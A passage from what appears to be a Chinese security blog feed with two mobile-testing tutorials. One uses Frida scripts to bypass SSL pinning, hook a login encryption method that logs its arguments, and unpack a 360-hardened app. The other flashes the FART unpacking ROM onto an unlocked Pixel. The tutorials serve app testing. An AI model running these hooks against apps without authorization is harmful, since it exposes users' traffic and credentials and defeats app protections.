class="string">&#x27;! Intercepted TrustManagerImp: &#x27;</span> + host);</span><br><span class="line">            <span class="keyword">return</span> untrustedChain;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup TrustManagerImpl pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into TrustManagerImpl&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">PinningTrustManager</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;appcelerator.https.PinningTrustManager&#x27;</span>);</span><br><span class="line">        <span class="title class_">PinningTrustManager</span>.<span class="property">checkServerTrusted</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;! Intercepted Appcelerator&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Setup Appcelerator pinning&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;* Unable to hook into Appcelerator pinning&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>在 APP 启用了 SSL Pinning 时，无法通过 Burp 或 Fiddle 等抓包工具进行直接抓取 Https 的流量包的。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231128201936123.png" data-caption="image-20231128201936123"><img src="/../images/mobile/frida/1/image-20231128201936123.png" alt="image-20231128201936123"></a></p><p>1、启动服务端</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231127205755131.png" data-caption="image-20231127205755131"><img src="/../images/mobile/frida/1/image-20231127205755131.png" alt="image-20231127205755131"></a></p><p>编写 frida 脚本，绕过 SSL Pinning。在电脑上启动 frida 客户端，对该 app 注入 SSL Pinning 脚本，绕过其限制。在启动前先执行 frida-ps -Uia 查找正在运行的 APP 找到我们需要绕过的 APP 的包名</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240216164737.jpg" data-caption="微信图片_20240216164737"><img src="/../images/mobile/frida/1/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240216164737.jpg" alt="微信图片_20240216164737"></a></p><p>脚本代码上文已列出，暂命名为 Bypass.js，启动脚本后手机自动启动 APP，然后再运行中注入绕过代码</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.app包名.xxxx -l Bypass.js</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231128202355240-17077199387342.png" data-caption="image-20231128202355240"><img src="/../images/mobile/frida/1/image-20231128202355240-17077199387342.png" alt="image-20231128202355240"></a></p><p>成功抓取到 Https 流量</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231128202609642-17077200954044.png" data-caption="image-20231128202609642"><img src="/../images/mobile/frida/1/image-20231128202609642-17077200954044.png" alt="image-20231128202609642"></a></p><h3 id="追踪加密函数"><a href="#追踪加密函数" class="headerlink" title="追踪加密函数"></a>追踪加密函数</h3><p>对某一 APP 加密函数进行追踪，代码如下</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209122317290.png" data-caption="image-20231209122317290"><img src="/../images/mobile/frida/1/image-20231209122317290.png" alt="image-20231209122317290"></a></p><p>直接右键复制为 frida 代码</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209122204941.png" data-caption="image-20231209122204941"><img src="/../images/mobile/frida/1/image-20231209122204941.png" alt="image-20231209122204941"></a></p><p>自动复制的 frida 脚本代码为，注意 m12903a 方法名在程序运行编译时被重载为 a ，由上图 renamed from：a* 可中，所以 frida脚本在编写时，m12903a 需要替换为 a</p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">LoginActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.方法名.LoginActivity&quot;</span>);</span><br><span class="line"><span class="title class_">LoginActivity</span>[<span class="string">&quot;a&quot;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str, str2, str3</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`LoginActivity.m12903a is called: str=<span class="subst">$&#123;str&#125;</span>, str2=<span class="subst">$&#123;str2&#125;</span>, str3=<span class="subst">$&#123;str3&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">this</span>[<span class="string">&quot;a&quot;</span>](str, str2, str3);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>修改完善代码</p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script Start Nowing&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LoginActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.方法名.LoginActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">LoginActivity</span>.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str, str2, str3</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LoginActivity.m12903a results are as follows&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str: &quot;</span> + str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str2: &quot;</span> + str2);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str3: &quot;</span> + str3);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用原始方法</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">a</span>(str, str2, str3);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>使用脚本进行 Hook,成功输出 m12903a 方法的结果</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209123411245-17077210950026.png" data-caption="image-20231209123411245"><img src="/../images/mobile/frida/1/image-20231209123411245-17077210950026.png" alt="image-20231209123411245"></a></p><p>现已知函数能被正常 Hook，继续进一步追踪程序在调用 m12903a 方法时的调用栈情况</p><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script Start Nowing&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LoginActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.方法名.LoginActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">LoginActivity</span>.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str, str2, str3</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LoginActivity.m12903a results are as follows&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str: &quot;</span> + str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str2: &quot;</span> + str2);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str3: &quot;</span> + str3);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用原始方法</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">a</span>(str, str2, str3);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 打印调用栈</span></span><br><span class="line">            <span class="keyword">var</span> stackTrace = <span class="title class_">Exception</span>.$new().<span class="title function_">getStackTrace</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LoginActivity.m12903a call stack results:&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;------------------------------------------------------------------------------------------------------------&quot;</span>);        </span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; stackTrace.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(stackTrace[i].<span class="title function_">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Error occurred while printing call stack: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231209130052729-17077213012428.png" data-caption="image-20231209130052729"><img src="/../images/mobile/frida/1/image-20231209130052729-17077213012428.png" alt="image-20231209130052729"></a></p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><h4 id="frida-dexdump"><a href="#frida-dexdump" class="headerlink" title="frida-dexdump"></a>frida-dexdump</h4><p>frida-dexdump 是一个基于 Frida 的安全工具，可通过查找并转储内存中的dex文件以实现脱壳。测试目标使用 360 加固，尝试利用 frida-dexdump 进行脱壳。项目地址：<a href="https://github.com/hluwa/frida-dexdump">https://github.com/hluwa/frida-dexdump</a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204204118906-170772140865410.png" data-caption="image-20231204204118906"><img src="/../images/mobile/frida/1/image-20231204204118906-170772140865410.png" alt="image-20231204204118906"></a></p><p>1、在安装完 frida 环境的基础上(这一部分就是上面 “工具安装” 章节)，然后直接利用 pip 可一键安装 frida-dexdump</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida-dexdump</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204203656939.png" data-caption="image-20231204203656939"><img src="/../images/mobile/frida/1/image-20231204203656939.png" alt="image-20231204203656939"></a></p><p>2、利用 adb 连接 Android ，然后再启动 frida-server</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line">cd data/app_test</span><br><span class="line">./frida-server-16.1.6-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204204558680.png" data-caption="image-20231204204558680"><img src="/../images/mobile/frida/1/image-20231204204558680.png" alt="image-20231204204558680"></a></p><p>3、Android 手机上运行需要测试的 APP，然后利用 frida-tools 查看该程序运行的 PID 号，已知 PID 号为 11256</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204205154000-170772151925312.png" data-caption="image-20231204205154000"><img src="/../images/mobile/frida/1/image-20231204205154000-170772151925312.png" alt="image-20231204205154000"></a></p><p>4、利用 <code>frida-dexdump</code> 进行脱壳处理,命令如下，这里选择 <code>frida-dexdump -U -p 11265</code> </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-dexdump -U -p PID</span><br></pre></td></tr></table></figure></div><p>由于 APP 存在 SSL Pinning 检测，导致脱壳失败，这边需要先进行Bypass SSL Pinning 然后再运行 frida-dexdump 进行脱壳处理</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210236674.png" data-caption="image-20231204210236674"><img src="/../images/mobile/frida/1/image-20231204210236674.png" alt="image-20231204210236674"></a></p><p>Bypass SSL Pinning ，这边直接使用脚本 Hook ，也可以直接利用 Objection 进行 Hook</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f cn.xx.xxx -l Bypass.js</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210507093-170772168463414.png" data-caption="image-20231204210507093"><img src="/../images/mobile/frida/1/image-20231204210507093-170772168463414.png" alt="image-20231204210507093"></a></p><p>再次运行 frida-dexdump 进行 dump dex</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Uia</span><br><span class="line">frida-dexdump -U -p PID</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210719257-170772176827616.png" data-caption="image-20231204210719257"><img src="/../images/mobile/frida/1/image-20231204210719257-170772176827616.png" alt="image-20231204210719257"></a></p><p>最后利用 jadx 进行反编译查看 dex 代码，具体脱壳效果如何，只能祈求上天的恩赐了。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/frida/1/image-20231204210740033.png" data-caption="image-20231204210740033"><img src="/../images/mobile/frida/1/image-20231204210740033.png" alt="image-20231204210740033"></a></p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackingarticles.in/android-penetration-testing-frida/</span><br><span class="line">https://frida.re/docs/home/</span><br><span class="line">https://github.com/frida/frida</span><br><span class="line">https://codeshare.frida.re/browse</span><br><span class="line">https://github.com/kaungkhantpy</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动安全-FART 脱壳机制作</title>
      <link href="/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FART%20%E8%84%B1%E5%A3%B3%E6%9C%BA%E5%88%B6%E4%BD%9C/"/>
      <url>/2024/02/16/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8-FART%20%E8%84%B1%E5%A3%B3%E6%9C%BA%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>ART环境下基于主动调用的自动化脱壳方案，详细原理就不在这里阐述了。本文主要内容为FART脱壳机的制作流程，原理请移步 <a href="https://github.com/hanbinglengyue/FART%E3%80%82">https://github.com/hanbinglengyue/FART。</a></p><h2 id="二、设备信息"><a href="#二、设备信息" class="headerlink" title="二、设备信息"></a>二、设备信息</h2><p>设备使用谷歌 Pixel，版本信息及外观如下图</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213135114.jpg" data-caption="微信图片_20240213135114"><img src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213135114.jpg" alt="微信图片_20240213135114"></a></p><h2 id="三、解除-BL-锁"><a href="#三、解除-BL-锁" class="headerlink" title="三、解除 BL 锁"></a>三、解除 BL 锁</h2><p>1、下载 platform-tools 工具，下载地址：<code>https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210153146157.png" data-caption="image-20231210153146157"><img src="/../images/mobile/fart/image-20231210153146157.png" alt="image-20231210153146157"></a></p><p>2、手机使用具有数据传输功能的 USB 数据线连接电脑，然后打开 Pixel 开发者模式，<code>设置-》关于手机-》连续点击版本号进行开发者模式</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213131540563.png" data-caption="image-20240213131540563"><img src="/../images/mobile/fart/image-20240213131540563.png" alt="image-20240213131540563"></a></p><p>开启 USB调试，<code>设置-》系统-》高级-》开发者选项-》点击打开USB调试</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132141986.png" data-caption="image-20240213132141986"><img src="/../images/mobile/fart/image-20240213132141986.png" alt="image-20240213132141986"></a></p><p>打开 OEM 解锁，该设置网络需要魔法，若网络没有魔法则该按钮显示灰色，不能打开。这一部分不多阐述，自行魔法网络（网络能访问 google 即可），然后重新回到 <code>设置-》系统-》高级-》开发者选项-》打开OEM按钮</code>即可，开启后可选择关闭魔法网络。截图如下：</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213131927904.png" data-caption="image-20240213131927904"><img src="/../images/mobile/fart/image-20240213131927904.png" alt="image-20240213131927904"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132039826.png" data-caption="image-20240213132039826"><img src="/../images/mobile/fart/image-20240213132039826.png" alt="image-20240213132039826"></a></p><p>3、安装驱动，首先下载 google usb 驱动，下载地址：<code>https://developer.android.com/studio/run/win-usb?hl=zh-cn</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210151052877.png" data-caption="image-20231210151052877"><img src="/../images/mobile/fart/image-20231210151052877.png" alt="image-20231210151052877"></a></p><p>需要手机 USB 连接电脑后进入 fastboot 模式下操作，Pixel 1 进入 fastboot 模式重启设备进入开启界面前长按<code>电源键+音量下 </code>，由下图可知 <code>Device is LOCKED</code></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132349724.png" data-caption="image-20240213132349724"><img src="/../images/mobile/fart/image-20240213132349724.png" alt="image-20240213132349724"></a></p><p>然后电脑上 <code>Win + x</code> 命令选择 <code>设备管理器-》其他设备-》Android</code>，进行安装 google usb 驱动</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170018512.png" data-caption="image-20231210170018512"><img src="/../images/mobile/fart/image-20231210170018512.png" alt="image-20231210170018512"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170048384.png" data-caption="image-20231210170048384"><img src="/../images/mobile/fart/image-20231210170048384.png" alt="image-20231210170048384"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170111120.png" data-caption="image-20231210170111120"><img src="/../images/mobile/fart/image-20231210170111120.png" alt="image-20231210170111120"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170152919.png" data-caption="image-20231210170152919"><img src="/../images/mobile/fart/image-20231210170152919.png" alt="image-20231210170152919"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170216431.png" data-caption="image-20231210170216431"><img src="/../images/mobile/fart/image-20231210170216431.png" alt="image-20231210170216431"></a></p><p>安装完成后，验证 fastboot 是否连接正常，电脑 platform-tools 目录下执行命令，若出现设备名称即 fastboot 则连接正常</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot devices</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210170326951.png" data-caption="image-20231210170326951"><img src="/../images/mobile/fart/image-20231210170326951.png" alt="image-20231210170326951"></a></p><p>4、然后执行命令解除 BL 锁，该命令在 fastboot 模式下或者直接在  platform-tools 目录下执行均可，本人是在连接 USB 数据线后，在 fastboot 模式下执行的，执行后手机会出现提示选择解除 BL 的按钮，音量键选择 Yes ，电源键确认即可</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flashing unlock</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20240213132641492.png" data-caption="image-20240213132641492"><img src="/../images/mobile/fart/image-20240213132641492.png" alt="image-20240213132641492"></a></p><p>此时可以看到 fastboot 模式下改为 Device is UNLOCKED，即已经解锁了</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213132723.jpg" data-caption="微信图片_20240213132723"><img src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213132723.jpg" alt="微信图片_20240213132723"></a></p><h2 id="四、刷入-FART"><a href="#四、刷入-FART" class="headerlink" title="四、刷入 FART"></a>四、刷入 FART</h2><p>1、下载fart刷机包：<code>https://www.cnblogs.com/r0ysue/p/16791596.html</code></p><p>2、选择刷机包，我这边使用的是 Pixel </p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210141849469.png" data-caption="image-20231210141849469"><img src="/../images/mobile/fart/image-20231210141849469.png" alt="image-20231210141849469"></a></p><p>将 image-sailfish-opm1.171019.011.zip 解压至当前文件夹内</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210142007934.png" data-caption="image-20231210142007934"><img src="/../images/mobile/fart/image-20231210142007934.png" alt="image-20231210142007934"></a></p><p>3、将 adb 目录下的 AdbWinApi.dll、AdbWinUsbApi.dll 放置电脑 C:&#x2F;Windows&#x2F;System 目录下</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210141749477.png" data-caption="image-20231210141749477"><img src="/../images/mobile/fart/image-20231210141749477.png" alt="image-20231210141749477"></a></p><p>将 adb.exe、fastboot.exe 放置电脑C:&#x2F;Windows&#x2F;System32 目录下</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210141832103.png" data-caption="image-20231210141832103"><img src="/../images/mobile/fart/image-20231210141832103.png" alt="image-20231210141832103"></a></p><p>4、现在就可以直接开始刷机了，fart 刷机包下执行,此时设备会多次重启，但会提示报错，先忽略</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash-all.bat </span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210171942824.png" data-caption="image-20231210171942824"><img src="/../images/mobile/fart/image-20231210171942824.png" alt="image-20231210171942824"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210171951985.png" data-caption="image-20231210171951985"><img src="/../images/mobile/fart/image-20231210171951985.png" alt="image-20231210171951985"></a></p><p>重启启动系统，成功刷入系统。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213133012.jpg" data-caption="微信图片_20240213133012"><img src="/../images/mobile/fart/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240213133012.jpg" alt="微信图片_20240213133012"></a></p><h2 id="五、脱壳"><a href="#五、脱壳" class="headerlink" title="五、脱壳"></a>五、脱壳</h2><p>验证是否能正常脱壳，首先需要重新开启开发者模式（系统可在设置里自定义选择中文），开启开发者步骤一样，这里不阐述。注意该脱壳机会将所有安装的软件自动进行脱壳处理，所以当刷完该系统后就不要当做正常的手机去使用了，避免性能拖垮了系统运行。</p><p>1、验证 adb 是否成功连接，如图 adb 能正常使用</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210173952265.png" data-caption="image-20231210173952265"><img src="/../images/mobile/fart/image-20231210173952265.png" alt="image-20231210173952265"></a></p><p>2、安装 app，并授予 sd 卡读写权限(否则dump下的文件无法写入到sdcard)</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210175614834-17078024397513.png" data-caption="image-20231210175614834"><img src="/../images/mobile/fart/image-20231210175614834-17078024397513.png" alt="image-20231210175614834"></a></p><p>3、利用 adb 监控 fart 的运行日志，然后打开 app 运行然后进行脱壳，出现 fart run over 表示 fart 正在运行脱壳</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat | grep &quot;fart&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210183127771.png" data-caption="image-20231210183127771"><img src="/../images/mobile/fart/image-20231210183127771.png" alt="image-20231210183127771"></a></p><p>adb shell ，然后进入 &#x2F;sdcard&#x2F;xxxx 目录，再进入脱壳 app 包目录，可查看在该包目录下已经有相当的 dex 文件。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/fart/image-20231210183725547.png" 